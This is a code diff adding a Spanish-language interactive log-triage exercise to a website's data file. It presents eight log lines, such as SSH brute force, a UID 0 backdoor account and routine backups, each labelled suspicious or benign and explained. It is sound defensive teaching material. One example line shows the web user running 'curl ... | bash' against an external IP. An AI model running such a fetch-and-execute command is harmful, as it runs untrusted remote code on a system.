@@ -158,4 +158,85 @@ const DATOS = {
     },
   ],
 
+  // Ejercicio interactivo de la sección ~/triage. Cada entrada es una línea de
+  // log y la decisión correcta. Para añadir más casos, copia un objeto y cambia
+  // los campos: la web se adapta sola al número de entradas.
+  triage: {
+    titulo: "Triage de logs",
+    intro:
+      "Esto es lo que hace un analista de guardia: mirar líneas de log y decidir cuáles son ruido y cuáles merecen una llamada. Ocho casos, a ver qué tal se te da.",
+    // Texto de cierre según el porcentaje de aciertos.
+    cierres: {
+      alto: "Buen ojo. La parte difícil de un turno no es cazar el ataque llamativo, es descartar rápido las otras cien líneas sin dejarte la que importa.",
+      medio: "Vas bien. Casi todos los fallos en un turno real salen de lo mismo: algo que parece raro pero es rutina, y algo que parece rutina y no lo es.",
+      bajo: "Cuesta más de lo que parece. Un turno son miles de líneas como estas y casi todas son ruido, así que el oficio está en saber qué mirar primero.",
+    },
+    casos: [
+      {
+        origen: "auth.log · servidor de salto",
+        linea:
+          "Mar 14 03:12:41 jump01 sshd[4411]: Failed password for invalid user admin from 203.0.113.47 port 52233 ssh2\nMar 14 03:12:42 jump01 sshd[4413]: Failed password for invalid user oracle from 203.0.113.47 port 52241 ssh2\n... 47 intentos desde la misma IP en 60 segundos",
+        sospechoso: true,
+        explicacion:
+          "Fuerza bruta de manual: 47 intentos en un minuto desde una sola IP y contra usuarios que ni existen en la máquina. Alguien despistado falla dos o tres veces con su propio nombre, no cuarenta y siete con nombres distintos.",
+      },
+      {
+        origen: "auth.log · servidor de aplicación",
+        linea:
+          "Mar 14 10:14:02 app03 sudo: manuel : TTY=pts/0 ; PWD=/home/manuel ; USER=root ; COMMAND=/usr/bin/apt upgrade",
+        sospechoso: false,
+        explicacion:
+          "Usuario conocido, en horario de oficina, desde una sesión interactiva y actualizando paquetes. Es mantenimiento. Lo suyo es que haya un cambio aprobado detrás, pero la línea en sí no es un incidente.",
+      },
+      {
+        origen: "Windows · visor de seguridad",
+        linea:
+          "Id. 4624 · Inicio de sesión correcto\nCuenta: svc_backup\nTipo de inicio de sesión: 10 (RemoteInteractive, RDP)\nDirección de origen: 198.51.100.23\nHora: 03:14",
+        sospechoso: true,
+        explicacion:
+          "Una cuenta de servicio no abre escritorio remoto: se usa para que un proceso arranque solo, con tipo de inicio 5 o 3. Que alguien entre por RDP con svc_backup de madrugada significa que esas credenciales están en manos de una persona.",
+      },
+      {
+        origen: "CyberArk · sesión privilegiada",
+        linea:
+          "PSM · sesión iniciada\nUsuario: mperez\nCuenta objetivo: root@db-nomina01\nSolicitud: CHG-20184, aprobada por el responsable de sistemas\nVentana: 09:00-11:00 · Grabación: activa",
+        sospechoso: false,
+        explicacion:
+          "Es justo el camino que se busca al montar IAM: acceso privilegiado pedido, aprobado, dentro de ventana y con la sesión grabada. Si todos los accesos a producción fueran así, la guardia sería aburrida.",
+      },
+      {
+        origen: "auth.log · servidor de ficheros",
+        linea:
+          "Mar 14 02:50:11 fs02 useradd[8821]: new user: name=svc_update, UID=0, GID=0, home=/home/svc_update\nMar 14 02:50:19 fs02 usermod[8830]: add 'svc_update' to group 'sudo'",
+        sospechoso: true,
+        explicacion:
+          "Un usuario nuevo con UID 0 es root con otro nombre. Creado a las tres menos diez de la mañana y metido en sudo nueve segundos después, sin ventana de cambios. Eso no es administrar, es dejarse una puerta abierta.",
+      },
+      {
+        origen: "syslog · servidor de respaldo",
+        linea:
+          "Mar 14 01:00:01 bkp01 CRON[2201]: (root) CMD (/usr/local/bin/backup.sh)\nMar 14 01:47:33 bkp01 backup.sh: copia completada · 412 GB · 0 errores",
+        sospechoso: false,
+        explicacion:
+          "La copia nocturna de siempre, a su hora y sin errores. El día que esta línea deje de aparecer, eso sí merece una mirada: los logs que faltan cuentan tanto como los que sobran.",
+      },
+      {
+        origen: "Entrust · gestión de certificados",
+        linea:
+          "AVISO · el certificado TLS de portal.interno caduca en 15 días (2026-03-29)\nEmisor: CA interna · Renovación automática: no configurada",
+        sospechoso: false,
+        explicacion:
+          "Es un aviso de caducidad, no un ataque, así que no se escala como incidente: se abre una tarea y se renueva. Eso sí, un certificado caducado tumba el portal igual de bien que un atacante.",
+      },
+      {
+        origen: "syslog · servidor web",
+        linea:
+          "Mar 14 16:22:07 web01 bash: www-data : COMMAND=curl -s http://198.51.100.77/x.sh | bash",
+        sospechoso: true,
+        explicacion:
+          "El usuario que sirve las páginas web descargando un script de una IP externa y ejecutándolo al vuelo. Ese usuario no se baja cosas de internet. Es la señal clásica de que alguien ya entró por la aplicación y está trayendo sus herramientas.",
+      },
+    ],
+  },
+
 };
